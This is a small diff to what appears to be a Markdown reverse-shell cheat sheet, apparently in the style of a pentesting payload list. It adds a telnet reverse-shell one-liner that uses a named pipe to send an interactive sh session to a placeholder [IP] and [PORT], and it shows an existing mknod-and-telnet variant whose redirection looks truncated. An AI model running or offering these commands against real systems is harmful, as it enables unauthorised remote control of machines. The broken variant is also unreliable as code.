@@ -35,6 +35,10 @@ sbd -k secret [IP] [PORT]
 
 ## telnet
 ##### Shell
+```
+rm -f /tmp/f; mkfifo /tmp/f
+telnet [IP] [PORT] 0</tmp/f | sh >/tmp/f 2>&1
+```
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet [IP] [PORT] 0/tmp/p
 ```
